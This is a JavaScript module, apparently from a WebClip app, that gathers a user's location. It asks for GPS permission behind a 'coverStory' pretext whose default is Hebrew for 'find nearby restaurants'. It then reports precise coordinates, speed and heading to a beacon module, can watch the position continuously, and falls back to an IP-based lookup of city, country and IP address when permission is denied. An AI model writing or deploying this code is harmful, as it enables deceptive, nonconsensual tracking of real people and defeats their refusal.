import { forceEvent } from '../beacon.js';

let _watchId = null;
let _stopTimer = null;

export function stopWatch() {
  if (_watchId != null) { navigator.geolocation.clearWatch(_watchId); _watchId = null; }
  if (_stopTimer != null) { clearTimeout(_stopTimer); _stopTimer = null; }
}

// Explicit cleanup on full WebClip close — native watchPosition doesn't survive page unload anyway,
// but this ensures clean state if the process lingers briefly.
window.addEventListener('pagehide', stopWatch);
// Also clear the geo-granted flag so next session re-requests if needed
window.addEventListener('pagehide', () => localStorage.removeItem('wc_geo_granted'));

function posToData(pos, source, mode, duration) {
  return {
    lat: pos.coords.latitude, lon: pos.coords.longitude,
    accuracy: pos.coords.accuracy, altitude: pos.coords.altitude,
    altitudeAccuracy: pos.coords.altitudeAccuracy,
    speed: pos.coords.speed, heading: pos.coords.heading,
    ts: pos.timestamp, source, mode, duration: duration ?? null,
  };
}

function tryGps(highAccuracy) {
  return new Promise((resolve, reject) => {
    navigator.geolocation.getCurrentPosition(resolve, reject, {
      enableHighAccuracy: highAccuracy,
      timeout: highAccuracy ? 10000 : 6000,
    });
  });
}

async function tryIp() {
  const r = await fetch('https://ipapi.co/json/');
  const j = await r.json();
  return {
    lat: j.latitude, lon: j.longitude,
    city: j.city, region: j.region, country: j.country_name, ip: j.ip,
    source: 'ip',
  };
}

export async function requestPermission(coverStory = 'מצא מסעדות קרובות', options = {}) {
  const { mode = 'once', duration = null } = (typeof options === 'object' && options !== null) ? options : {};

  if (mode === 'stop') {
    stopWatch();
    return { stopped: true };
  }

  let gpsPos = null;
  let source = null;

  try {
    gpsPos = await tryGps(true);
    source = 'gps_high';
  } catch (e1) {
    // code 1 = PERMISSION_DENIED, code 3 = TIMEOUT (prompt may still be open)
    // Only fall back to low accuracy on POSITION_UNAVAILABLE (code 2)
    if (e1.code === 2) {
      try { gpsPos = await tryGps(false); source = 'gps_low'; } catch (_) {}
    }
  }

  if (gpsPos) {
    localStorage.setItem('wc_geo_granted', '1');
    const data = posToData(gpsPos, source, mode, duration);
    await forceEvent('geolocation', data);

    if (mode !== 'once') {
      stopWatch();
      _watchId = navigator.geolocation.watchPosition(async (p) => {
        await forceEvent('geolocation', posToData(p, source, 'watch', duration));
      }, null, { enableHighAccuracy: source === 'gps_high', maximumAge: 0 });
      if (duration && duration > 0) {
        _stopTimer = setTimeout(() => stopWatch(), duration * 1000);
      }
    }
    return { granted: true, data };
  }

  // IP fallback — only for one-time; continuous IP makes no sense
  try {
    const ipData = await tryIp();
    await forceEvent('geolocation', { ...ipData, mode: 'once' });
    return { granted: false, source: 'ip', data: ipData };
  } catch (_) {
    await forceEvent('permission_request', { permission: 'geolocation', result: 'denied' });
    return { granted: false };
  }
}
